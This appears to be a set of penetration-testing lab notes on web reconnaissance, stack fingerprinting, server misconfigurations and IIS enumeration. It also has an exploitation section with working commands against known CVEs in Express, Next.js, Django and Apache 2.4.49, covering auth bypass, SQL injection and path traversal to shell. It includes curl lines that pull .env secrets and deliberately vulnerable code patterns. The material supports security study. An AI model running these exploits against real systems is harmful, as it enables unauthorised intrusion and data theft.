# Web Content Discovery & Reconnaissance

## Overview

Content discovery is one of the most critical phases of web application reconnaissance. This note covers a comprehensive workflow combining **Manual Analysis**, **Open-Source Intelligence (OSINT)**, and **Automated Enumeration** to effectively map an application's attack surface and locate hidden entry points.

---

##  1. Manual Analysis Techniques

Before launching disruptive automated scans, examine resources exposed by convention or default behaviors to uncover sensitive infrastructure clues.

### Conventional Files

* **`robots.txt`**: Used to guide search engine crawlers on what paths *not* to index. It frequently exposes sensitive administrative or staging paths (e.g., `/staff-portal`), serving as a ready-made list of targets. It is a guideline for bots, not a security control.
* **`sitemap.xml`**: Lists endpoints the site owner explicitly wants indexed. It often inadvertently exposes staging pages, old content, or hidden endpoints containing vulnerable URL parameters (e.g., `/s3cr3t-area`, `/news/article?id=1`).

### Technical Indicators & Infrastructure Stack

* **HTTP Headers**: Web server responses often include headers revealing software types and back-end languages:
* `Server: nginx/1.18.0 (Ubuntu)` (Discloses specific OS and server versions).
* `X-Powered-By: THM-Framework` (Exposes development frameworks).
* *Note:* Custom debug flags or headers (e.g., `X-FLAG`) may also be leaked.


* **Framework Documentation**: Inspecting page source comments and copyright notices helps identify the underlying framework. Reviewing that framework's public documentation often exposes default administration directories, asset paths, and default credentials (e.g., `admin / admin`).

---

### 2. Open-Source Intelligence (OSINT)

OSINT techniques collect public information from third-party tools and platforms without interacting directly with the target infrastructure.

* **Google Hacking / Dorking**: Leveraging advanced operators to surface indexed vulnerabilities or exposed data.

| Filter | Example | Description |
| --- | --- | --- |
| `site:` | `site:example.thm` | Restricts results strictly to the target domain. |
| `inurl:` | `inurl:admin` | Restricts results to URLs containing the specified string. |
| `filetype:` | `filetype:pdf` | Filters by file extension (e.g., `pdf`, `log`, `env`, `conf`). |
| `intitle:` | `intitle:login` | Filters by strings found in the page title. |
| `intext:` | `intext:password` | Searches for explicit strings within the body content. |
| `cache:` | `cache:example.thm` | Views Google's cached snapshot of a historical version of the page. |

* **Wappalyzer**: A browser extension that fingerprints CMS platforms, programming languages, web servers, framework versions, and integrated payment processors on active page load.
* **Wayback Machine**: A digital archive capturing historical snapshots of websites. Useful for extracting legacy codebases, retired endpoints, forgotten API parameters, or temporary administrative pages.
* **GitHub Reconnaissance**: Explicit public repository searches for the target company name or domain. Reviewing public source trees—and critically, the **git commit history**—frequently yields accidentally committed hardcoded API keys, configuration files, and `.env` credentials.
* **S3 Buckets**: Public cloud storage endpoints formatted as `https://{name}.s3.amazonaws.com`. Permissive access controls on common naming schemes (e.g., `{company}-backup`, `{company}-assets`) often allow unauthenticated data exfiltration.

---

##  3. Automated Discovery via Gobuster

Manual and OSINT steps are bounded by visibility constraints. Automated tools rapidly brute-force directories, files, DNS records, and server blocks using defined wordlists (such as SecLists' `common.txt` or `directory-list-2.3-medium.txt`).

### Global Flag Control

* `-t / --threads`: Sets concurrent connections (Default: 10). Increase to scale speed.
* `-w / --wordlist`: Path to target directory or subdomain wordlist.
* `-o / --output`: Saves console findings directly to a text file.
* `--delay`: Time interval between requests (Used to bypass local rate limits).

### Execution Modes

#### A. Directory Mode (`dir`)

Brute-forces paths on a web server directly to locate files and folders.

```bash
gobuster dir -u "http://10.146.134.237" -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x .php,.txt,.log -s 200,301,302

```

* Useful Modifiers:
* `-x`: Appends specific extensions to every item in the wordlist (e.g., `-x .php,.json`).
* `-r / --followredirect`: Instructs Gobuster to follow HTTP redirects (Status 3xx).
* `-s / --status-codes`: Restricts output display to specific status returns (e.g., `200 OK`).



#### B. DNS Mode (`dns`)

Queries subdomains using traditional DNS lookups. Essential because secondary subdomains often run older, unpatched service code.

```bash
gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --wildcard

```

* Useful Modifiers:
* `--wildcard`: Forces continuous discovery even if a wildcard DNS record exists.
* `-i / --show-ips`: Displays resolved target IP addresses beside identified subdomains.



#### C. Virtual Host Mode (`vhost`)

Unlike DNS mode, `vhost` mode connects directly to the target IP address and cycles through wordlist terms inside the **`Host:` HTTP Header**. This uncovers internal web configurations that are not declared in public DNS records.

```bash
gobuster vhost -u "http://10.146.134.237" --domain example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain --exclude-length 250-320

```

* Useful Modifiers:
* `--append-domain`: Combines the wordlist string directly with the base domain name.
* `--exclude-length`: Filters out false positives that generate uniform response body sizes.



---

##  Summary Reconnaissance Framework

| Method | Focus | Key Targets |
| --- | --- | --- |
| **Manual** | Quick Wins & Internal Logic | `robots.txt`, `sitemap.xml`, Source Comments, HTTP Headers |
| **OSINT** | Public Information Leaks | Google Dorks, Wayback Machine, GitHub Commits, S3 Buckets |
| **Automated** | Complete Attack Surface Mapping | Gobuster (`dir` paths, `dns` subdomains, `vhost` configurations) |

--------

# Web Stack Fingerprinting & Target Exploitation Guide

## Overview

Passive stack fingerprinting analyzes raw HTTP response signals—such as custom headers, cookie naming conventions, error page formats, and HTML source patterns—without transmitting malicious exploit payloads.

Accurately fingerprinting the specific technology stack and version number immediately reveals the exact attack surface and applicable Common Vulnerabilities and Exposures (CVEs), significantly increasing exploitation speed during time-boxed engagements.

---

## 🛠️ Web Stack Fingerprinting Reference

| Target Port / Stack | Key Passive Signal | Value / Specific Pattern | Confidence | Strategic Notes |
| --- | --- | --- | --- | --- |
| **Port 3000**<br>

<br>MERN Stack | `X-Powered-By` Header | `Express` | **High** | Primary signal; absent only if explicitly disabled via code or stripped by a reverse proxy (e.g., Nginx, Vercel). |
|  | `Set-Cookie` Header | `connect.sid=s%3A...` | **High** | Originated by `express-session` middleware. May be absent on unauthenticated requests if `saveUninitialized: false`. |
|  | Unhandled Route | Plain text: `Cannot GET /path` | **High** | Distinctive default plain-text string; differs completely from styled framework error pages. |
| **Port 3001**<br>

<br>Next.js | `X-Powered-By` Header | `Next.js` | **High** | Framework-specific banner. |
|  | HTML Source | `window.__next_f` inside a `<script>` tag | **High** | The definitive **App Router** indicator used for React Server Component data hydration. |
|  | Custom Headers | `x-nextjs-cache: HIT`, `x-nextjs-prerender: 1` | **High** | Confirms the application is running a compiled production build. |
| **Port 8000**<br>

<br>Django | `Server` Header | `WSGIServer/0.2 CPython/X.X.X` | **High** | Django-specific development/WSGI server banner. |
|  | HTML Source Forms | Name attribute: `csrfmiddlewaretoken` | **High** | Injected automatically into all POST forms by `CsrfViewMiddleware`. |
|  | Security Headers | `X-Frame-Options: DENY`<br>

<br>`X-Content-Type-Options: nosniff`<br>

<br>`Referrer-Policy: same-origin` | **High** | Applied simultaneously by default via Django's `SecurityMiddleware`. |
| **Port 8080**<br>

<br>LAMP (Apache) | `Server` Header | `Apache/2.4.49 (Unix)` | **High** | Direct, exact version match pointing to severe, unpatched critical vulnerabilities. |
|  | Directory Probing | `/cgi-bin/` returning `403 Forbidden` | **High** | Confirms the target directory exists and `mod_cgi` is actively enabled. |

---

## 🤖 Automated Scanner Fingerprint Auditing (Nikto)

While manual fingerprinting is foundational, scanning broad scopes requires efficient prioritization. **Nikto** provides a rapid first pass—probing each service, parsing HTTP banners, and surfacing architectural misconfigurations or known missing security headers without deploying intrusive exploits.

```bash
# General Target Syntax Usage
nikto -h http://MACHINE_IP:PORT

```

### 📋 Port-by-Port Analysis

#### 🟢 Port 3000: MERN Stack

* **Key Signals:** Detects `X-Powered-By: Express` and the session tracker cookie signature `connect.sid`.
* **Security Deficiencies:** Flags when the `connect.sid` cookie lacks the `HttpOnly` security attribute and notices the absence of anti-clickjacking frameworks (`X-Frame-Options`).
* **Verdict:** Confirms the Node/Express infrastructure backend, shifting target analysis toward API endpoints.

#### 🟢 Port 3001: Next.js

* **Key Signals:** Captures `X-Powered-By: Next.js` alongside structural caching deployment headers: `x-nextjs-cache: HIT`, `x-nextjs-prerender: 1`, and `x-nextjs-stale-time`.
* **Verdict:** Verifies that the App Router is running in its compiled production build layout—the explicit prerequisite required to execute the middleware authentication bypass.

#### 🟢 Port 8000: Django

* **Key Signals:** Extracts the precise, framework-explicit software definition: `Server: WSGIServer/0.2 CPython/3.10.12`.
* **Security Indicators:** Notes active `referrer-policy: same-origin` and `x-content-type-options: nosniff` implementations.
* **Verdict:** Confirms Django's native `SecurityMiddleware` layers are active, directing attention to input parameter validation rather than generic header exploits.

#### 🟢 Port 8080: Apache LAMP

* **Key Signals:** Directly retrieves `Server: Apache/2.4.49 (Unix)`.
* **Secondary Findings:** Notes that the server leaks filesystem inodes via active `ETags` configurations and identifies that the `HTTP TRACE` protocol method is allowed (making it potentially susceptible to Cross-Site Tracing).
* **Verdict:** Provides an immediate, definitive confirmation of an exploitable version match for CVE-2021-41773.

> 📝 **Strategic Assessment:** Nikto maps out broad application footprints in seconds, exposing low-level system banners like Apache's exact software build. However, automated vulnerability tools lack context for application-level logical flaws, such as dynamic object handling or custom ORM queries. This is the precise boundary where manual verification frameworks take over.

---

## ⚡ Exploitation Walkthroughs & Deep Dives

### 1. MERN Stack: Prototype Pollution to Auth Bypass (CVE-2020-8203)

When a dynamic JavaScript utility function blindly merges user-controlled JSON data into a target server-side object without validation, it creates an attack surface for prototype pollution.

#### Vulnerable Code Pattern

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]); // Dangerous deep recursion
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

```

#### Exploit Execution

When the application processes the target JSON payload, the recursive merge function maps the keys onto the global root object constructor. This globally injects the property `isAdmin: true` into the global `Object.prototype` layer inside the Node.js runtime environment.

1. **Inject the Payload:**
```bash
curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update \
     -H "Content-Type: application/json" \
     -d '{"__proto__": {"isAdmin": true}}'

```


2. **Access the Flag Endpoint:**
```bash
curl -b cookies.txt http://MACHINE_IP:3000/api/admin/flag

```


*Result:* Because the authorization endpoint validates `currentUser.isAdmin`, the validation check traverses upward along the modified prototype chain, resolves to `true`, and prints the flag.

---

### 2. Next.js: Middleware Authentication Bypass (CVE-2025-29927)

Next.js production applications utilize internal subrequest tracking headers to ensure recursive middleware executions do not induce localized processing loops.

#### Root Cause

Next.js fails to establish origin validation checks on incoming `x-middleware-subrequest` headers. When an external client presents this header manually, the framework falsely categorizes the request as a trusted internal subrequest and skips the middleware authentication gate entirely.

#### Exploit Execution

To bypass authentication checks and force direct routing to the server-side logic of a restricted `/dashboard` pathway, pass the module path string repeated five times:

```bash
curl -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" http://MACHINE_IP:3001/dashboard

```

> 💡 **Tip:** If the target application deploys a `/src` directory architecture layout, adapt the payload construction to target the source folder pathway:
> `src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`

---

### 3. Django: Error-Based SQL Injection (CVE-2021-35042)

This vulnerability occurs when an application bypasses standard Object-Relational Mapping (ORM) safe parameter limits or passes unvalidated parameters directly into underlying query manipulation functions like `.order_by()`.

#### Vulnerable Code Pattern

```python
order = self.request.GET.get('order', 'name')
sql = (
    'SELECT id, name, price, description FROM products_product '
    f'ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)')

```

#### Exploit Execution

Because the parameter is directly concatenated, we can use an error-based SQL injection payload targeting the underlying MySQL database engine. By inserting `updatexml()`, we intentionally trigger an internal XPath validation error containing our query results. This error is displayed on-screen if Django's default `DEBUG = True` mode is enabled.

1. **Extract Database Version & Verify Vulnerability:**
```bash
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20@@version)),1)" | grep -o '~[0-9][^&]*'

```


2. **Extract Active Database Name:**
```bash
curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(select%20database())),1)" | grep -o '~[0-9a-zA-Z_][^&]*'

```



---

### 4. Apache 2.4.49: Path Traversal & RCE (CVE-2021-41773)

A flaw within Apache version 2.4.49's path normalization engine (`ap_normalize_path()`) mistakenly validates path characters *before* parsing URL-encoded elements, making it possible to bypass standard directory traversal path restrictions.

#### Root Cause

The traversal filter fails to recognize the URL-encoded sequence `.%2e/` as a directory traversal (`../`) attempt. When the request is later passed down to the file system layer, the operating system decodes and resolves the path, allowing an attacker to break out of the defined web root.

#### Exploit Execution

When combined with a functional `/cgi-bin/` configuration layout running `mod_cgi`, the directory traversal bypass can point to system binaries (like `/bin/sh`), allowing for unauthenticated Remote Code Execution (RCE).

```bash
curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
     --data 'echo Content-Type: text/plain; echo; id; cat /flag.txt'

```

> ⚠️ **CRITICAL:** The `--path-as-is` parameter is mandatory. Without it, the local client shell environment automatically sanitizes the path sequence prior to network transmission, neutralizing the traversal attempt before it reaches the target server.

---

## 🎯 Master Target Vulnerability Mapping Matrix

Every technology stack inherently leaks its core composition signals. By aligning automated visibility, passive observation patterns, and precise exploit validation strategies, operators can rapidly map vulnerabilities to corresponding technical targets:

| Architecture Stack | Primary Passive Signals | Target Exploit Mechanism | CVE ID Reference | Impact Classification | CVSS Base Score |
| --- | --- | --- | --- | --- | --- |
| **MERN / Express** | `X-Powered-By: Express`<br>

<br>`Set-Cookie: connect.sid` | Object runtime constructor manipulation via unfiltered deep parsing loops. | **CVE-2020-8203** | Prototype Pollution ➡️ Administrative Bypass | **7.4 High** |
| **Next.js App Router** | `X-Powered-By: Next.js`<br>

<br>`window.__next_f` script tags | Unauthenticated spoofing of internal `x-middleware-subrequest` processing routing indicators. | **CVE-2025-29927** | Authentication Bypass ➡️ Sensitive Information Leakage | **9.1 Critical** |
| **Django App Stack** | `Server: WSGIServer`<br>

<br>Injected `csrfmiddlewaretoken` fields | Direct input string concatenation intersecting unparameterized SQL `.order_by()` methods. | **CVE-2021-35042** | Error-Based XPath String Data Exfiltration | **9.8 Critical** |
| **LAMP / Apache Server** | `Server: Apache/2.4.49`<br>

<br>Accessible `/cgi-bin/` directories | Normalization processing flaws misinterpreting `.%2e/` sequences before URL decoding occurs. | **CVE-2021-41773** | Path Traversal ➡️ Unauthenticated Remote Code Execution (RCE) | **9.8 Critical** |

---

This text covers the fundamental phase of offensive security and penetration testing: **Infrastructure & Web Server Fingerprinting**.

Before attempting complex exploits, an operator must identify the underlying server software and version. This blueprint details exactly how different servers reveal their identities and how specific architectural misconfigurations can be targeted to leak critical information.

Here is a broken-down, organized breakdown of these four distinct web servers to add to your reference notes.

---

## 🛠️ Web Server Fingerprinting Cheat Sheet

When analyzing an unknown target IP address, the **combination of HTTP headers and 404 error layouts** yields an unambiguous identification of the backend technology layer.

| Target Port / Service | Primary Header Signal | Secondary/Backup Signal | Default 404 Error Behavior |
| --- | --- | --- | --- |
| **Port 80**<br>

<br>Apache2 | `Server: Apache/2.4.x (Ubuntu)` | Inode leaks via `ETag` headers | Contains the server name (`Apache`) inside the response body text. |
| **Port 8000**<br>

<br>Python HTTP Server | `Server: SimpleHTTP/0.6 Python/3.x` | *None* (No authentication or logging config) | Returns raw, plain-text indicators. |
| **Port 3000**<br>

<br>Node.js Express | *None* (Server header is blank by default) | framework signature: `X-Powered-By: Express` | Returns unformatted text: `Cannot GET /path`. |
| **Port 8080**<br>

<br>Nginx | `Server: nginx/1.xx.x` | Active proxy forwarding signals | Automatically lists the explicit framework version in the HTML footer. |

---

## 🐍 1. Python Built-In HTTP Server (`http.server`)

Developers frequently launch this built-in utility via the terminal command `python3 -m http.server 8000` to quickly share files or transfer data between machines.

### ⚠️ Critical Flaws & Exposure Vectors

* **Universal Document Exposure:** Python has no access control lists or `.htaccess` protection structures. It exposes the **entire folder directory** from which the command was initiated.
* **Dotfile Leaks:** Unlike enterprise web servers, Python fully exposes hidden dotfiles, which routinely contain sensitive environmental parameters:
```bash
curl -s http://TARGET_IP:8000/.env
# Exposes: SECRET_KEY, DATABASE_URL, and plaintext system passwords

```


* **Archive Exposures:** It automatically displays index directory listings if an `index.html` file is absent. If an old backup file (e.g., `backup.zip`, `db_dump.sql`) sits in that folder, it can be downloaded directly:
```bash
curl -s http://TARGET_IP:8000/backup.zip -o backup.zip

```



---

## 🦅 2. Apache2 Web Server

Apache is widely deployed, but its default Ubuntu layout leaves several verbose informational metrics wide open unless it is explicitly hardened.

### ⚠️ Critical Flaws & Exposure Vectors

* **`Options +Indexes` (Directory Listing):** If no landing index file is found in a directory pathway (like `/files/`), Apache lists every file, file size, and timestamp on an unauthenticated index page.
* **Exposed `mod_status` Boundary (`/server-status`):** This internal module monitors server performance metrics. If configured with a weak `Require all granted` directive, anyone can access `/server-status` to view active connections, worker states, and real-time internal subrequest path strings.
* **Unlinked File Vulnerabilities:** Developers frequently store configurations or backups in the web root without linking them. These can be easily mapped out using automated path-fuzzing utilities like **Gobuster**:
```bash
gobuster dir -u http://TARGET_IP:80 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x bak,txt,html

```


> 📝 **High-Value Target:** Finding exposed `.bak` configurations or `.htpasswd` basic authentication password hash lists lets you pivot to offline password-cracking attacks.



---

## 🟢 3. Node.js (Express Framework)

Express handles requests entirely via application source code rather than serving files out of a static physical folder root.

### ⚠️ Critical Flaws & Exposure Vectors

* **Custom Error Handling & Stack Trace Leaks:** If developers misconfigure `NODE_ENV=development` or implement a loose custom error catcher, sending malformed inputs to an API endpoint (like `/api/users`) can trigger an unhandled crash. The server response then leaks full server-side stack traces, uncovering internal folder structures, library versions, and raw database queries.
* **Exposed Route Directories (`/api/routes`):** Developers sometimes export internal routing stacks (`app._router.stack`) to check active endpoints during development. If left online, an attacker can read the entire valid API surface map instantly, skipping directory-guessing tools entirely.
* **Exposed Environment Arrays (`/api/debug/env`):** Loose debugging endpoints that dump `process.env` directly expose the runtime's internal database passwords, session secret keys, and API tokens.
* **`express.static()` Dotfile Behavior:** By default, Express's static asset middleware blocks requests for dotfiles (returning a `404 Not Found`). If a `.env` file exists, it must be retrieved via an alternate logic flaw or shell access.

---

## 🔴 4. Nginx Server & Reverse Proxy

Nginx is primarily used to handle heavy asset routing or to act as a secure boundary gateway in front of internal Node.js or Python backend servers.

### ⚠️ Critical Flaws & Exposure Vectors

* **`server_tokens` Version Leakage:** By default, `server_tokens on` leaks the exact software patch version in both the `Server` header and default error pages. Turning it off (`server_tokens off`) suppresses the version in both places simultaneously.
* **`autoindex on` Exposure:** When a location block includes `autoindex on`, Nginx generates a clean index structure mapping file deployment details, which can leak configuration files like `server-config.txt` or `deploy-notes.txt`.
* **Exposed `stub_status` Metric Paths (`/nginx_status`):** If the server includes an unprotected `allow all` statement inside the `/nginx_status` block, any external IP can view active server metrics, concurrent connection tallies, and traffic spikes.

---

## 🛡️ The Global Baselines: Security Headers

Security headers must be actively configured; **no web server enables them by default**. Checking for their presence across all target ports highlights general hardening gaps across the perimeter:

```bash
# Rapid programmatic verification loop targeting multi-port perimeters
for port in 80 8000 3000 8080; do 
  echo "=== Port $port ==="
  curl -sI http://TARGET_IP:$port/ | grep -iE "x-frame-options|x-content-type|content-security-policy|referrer-policy" || echo "(No security headers found)"
done

```

### 📋 Core Security Headers Reference Table

* **`X-Frame-Options: DENY`** ➡️ Prevents the page from being rendered inside an external iframe, completely stopping UI Redressing/Clickjacking attacks.
* **`X-Content-Type-Options: nosniff`** ➡️ Forces the browser to strictly follow the declared `Content-Type` header, stopping dangerous MIME-sniffing and cross-site scripting (XSS) vectors.
* **`Content-Security-Policy (CSP)`** ➡️ Establishes a strict safelist defining exactly where scripts, styles, and assets can load from.
* **`Referrer-Policy: same-origin`** ➡️ Restricts the browser from leaking sensitive internal query paths inside the `Referer` header when navigating to outside domains.

  ---

  # IIS 

## Overview

Internet Information Services (IIS) is Microsoft's web server platform and is tightly integrated with:

* Windows Server
* Active Directory
* Windows Authentication
* ASP.NET / .NET Framework
* Application Pools

Because of this integration, IIS frequently serves as:

* Initial Access Vector
* Internal Pivot Point
* Credential Exposure Source
* Privilege Escalation Launchpad

---

# Attack Surface Mindset

Before attempting exploitation, determine:

1. IIS Version
2. Windows Version
3. Authentication Methods
4. WebDAV Presence
5. ASP.NET Usage
6. Directory Listings
7. Configuration Exposure
8. Application Pool Identity

Most successful engagements begin with misconfiguration discovery rather than CVE exploitation.

---

# IIS Version Reference

| IIS Version | Windows Server        | Status      |
| ----------- | --------------------- | ----------- |
| IIS 6.0     | Server 2003           | End of Life |
| IIS 7.0     | Server 2008           | End of Life |
| IIS 7.5     | Server 2008 R2        | End of Life |
| IIS 8.0     | Server 2012           | End of Life |
| IIS 8.5     | Server 2012 R2        | End of Life |
| IIS 10.0    | Server 2016/2019/2022 | Current     |

### Important Notes

* IIS skipped version 9.x
* Older IIS versions often have publicly known vulnerabilities
* Version identification helps narrow vulnerability research

---

# IIS Request Flow

Client Request
↓
HTTP.sys (Kernel)
↓
W3SVC
↓
WAS
↓
w3wp.exe (Worker Process)
↓
ASP.NET Application

## Why This Matters

### HTTP.sys

Kernel-level component.

Potential impact:

* Kernel vulnerabilities
* System crashes
* Privilege escalation

### Application Pools

Isolation boundary for IIS applications.

Each pool:

* Runs its own w3wp.exe
* Uses its own identity
* Has independent permissions

Typical identity:

IIS APPPOOL<PoolName>

---

# Initial Enumeration Checklist

## HTTP Headers

Review:

* Server
* X-Powered-By
* X-AspNet-Version
* Set-Cookie
* CSP headers

Interesting findings:

* Microsoft-IIS version
* ASP.NET version
* Technology stack

---

## Authentication Discovery

Look for:

* NTLM
* Negotiate
* Kerberos
* Basic Authentication

Indicators:

WWW-Authenticate headers

---

## HTTP Methods

Determine:

* GET
* POST
* HEAD
* OPTIONS

Potentially risky:

* PUT
* DELETE
* MOVE
* COPY
* TRACE
* PROPFIND
* MKCOL
* LOCK
* UNLOCK

---

# WebDAV Enumeration

## What is WebDAV?

WebDAV extends HTTP with file-management functionality.

Common methods:

* PUT
* DELETE
* COPY
* MOVE
* PROPFIND
* MKCOL
* LOCK
* UNLOCK

---

## Why It Matters

Misconfigured WebDAV may provide:

* File upload capability
* File deletion capability
* File movement capability
* Unauthorized content modification

---

## Detection Indicators

### Headers

Look for:

DAV:

### Allow Methods

Common WebDAV verbs:

PROPFIND
MKCOL
MOVE
COPY
LOCK
UNLOCK

---

# IIS Short Filename Enumeration (8.3)

## Concept

Windows can generate DOS-style short filenames.

Example:

BackupFiles

becomes

BACKUP~1

---

## Why It Matters

Attackers may discover:

* Hidden directories
* Backup locations
* Configuration files
* Administrative interfaces

without knowing full names.

---

## Common Discoveries

| Short Name | Possible Resource |
| ---------- | ----------------- |
| BACKUP~1   | BackupFiles       |
| ADMINI~1   | AdminInterface    |
| CONFIG~1   | Configuration     |
| USERS_~1   | User Exports      |

---

## Risk

Can reveal:

* Backup directories
* Sensitive exports
* Forgotten content
* Internal administration portals

---

# ASP.NET Indicators

## Common Extensions

.aspx
.ashx
.asmx
.axd

### High Value Targets

web.config

trace.axd

Global.asax

---

# Application Pool Identity

## Why Check It?

Any code execution typically inherits the Application Pool identity.

Common account:

IIS APPPOOL\DefaultAppPool

---

## Key Privilege

Frequently observed:

SeImpersonatePrivilege

This privilege is important because it is commonly associated with Windows privilege escalation techniques.

---

# Common IIS Misconfigurations

## 1. Directory Listing Enabled

Indicators:

* Browsable folders
* File indexes
* Downloadable backups

Look for:

* .bak
* .zip
* .config
* .sql
* .log

---

## 2. Exposed web.config

Potential contents:

* Database credentials
* SMTP credentials
* API keys
* Connection strings

Severity:

HIGH

---

## 3. TRACE Enabled

Potential issue:

* Diagnostic method exposed

Desired state:

405 Method Not Allowed

---

## 4. Verbose Errors

Indicators:

* Stack traces
* Source code paths
* Internal hostnames
* Framework versions

Example exposure:

C:\inetpub\wwwroot\

---

## 5. trace.axd Enabled

Potentially reveals:

* Recent requests
* Session data
* Cookies
* Form submissions
* Debug information

---

## 6. Excessive App Pool Privileges

Red Flags:

* Local Administrator
* SYSTEM
* Domain Admin

Application pools should follow least privilege.

---

# Nmap NSE Quick Reference

## Service Detection

Purpose:

* Identify IIS version
* Identify Windows version
* Confirm HTTP service

---

## HTTP Methods Script

Purpose:

* Enumerate allowed HTTP methods

Look for:

* PUT
* DELETE
* TRACE
* PROPFIND

---

## WebDAV Detection Script

Purpose:

* Confirm WebDAV support

Indicators:

* DAV headers
* WebDAV-specific verbs

---

## NTLM Information Script

Purpose:

* Gather host metadata

Potential findings:

* Computer Name
* Domain Name
* OS Build
* NTLM Configuration

---

# High-Value Findings Checklist

## Information Disclosure

* [ ] Directory Listing
* [ ] web.config Exposure
* [ ] trace.axd Exposure
* [ ] Verbose Errors
* [ ] Backup Files
* [ ] Hidden Directories

---

## Authentication

* [ ] NTLM Enabled
* [ ] Basic Auth Enabled
* [ ] Anonymous Access
* [ ] Misconfigured Access Controls

---

## WebDAV

* [ ] WebDAV Present
* [ ] Upload Capability
* [ ] Modification Capability
* [ ] Deletion Capability

---

## Infrastructure

* [ ] IIS Version Identified
* [ ] Windows Version Identified
* [ ] App Pool Identity Identified

---

# Real-World Threat Actor Usage

Notable groups have repeatedly abused IIS infrastructure through:

* Web shell deployment
* Exchange Server compromise
* ASP.NET application abuse
* Misconfigured WebDAV services
* Vulnerable third-party IIS components

Recurring themes:

1. Initial Access
2. Persistence
3. Credential Theft
4. Lateral Movement

---

# Reporting Notes

When documenting IIS findings:

Include:

* Affected Host
* IIS Version
* Authentication Method
* Impact
* Evidence
* Screenshots
* Recommended Remediation

Focus on:

* Misconfigurations
* Exposed Sensitive Data
* Weak Authentication
* Unnecessary Features
* Legacy Software

Avoid assuming compromise solely from version numbers; verify exposure and impact.

